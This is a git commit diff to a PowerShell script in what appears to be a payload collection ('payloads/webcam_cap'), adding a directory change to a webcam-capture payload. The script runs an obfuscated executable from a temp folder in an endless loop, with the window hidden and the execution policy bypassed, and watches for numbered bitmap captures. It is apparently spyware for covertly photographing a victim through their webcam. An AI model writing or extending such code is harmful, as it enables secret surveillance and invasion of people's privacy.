41f79475c1f4c09833db4cfc742ee825371c86d8
Soumyo001 <www.soumyo@gmail.com>
2025-02-04 22:05:40 +0600

    modified webcam script

--- payloads/webcam_cap/webcam.ps1
+++ payloads/webcam_cap/webcam.ps1
@@ -1,5 +1,6 @@
 $count=0
 $curr_dir="$env:temp\QKlYTmHhCDy"
+cd "$curr_dir"
 while($true){
     powershell -noP -ep bypass -w hidden "$curr_dir\KJUwHZlCNV.exe"
     while(Test-Path -Path "$curr_dir\TmreCWpLEnhx${count}.bmp"){
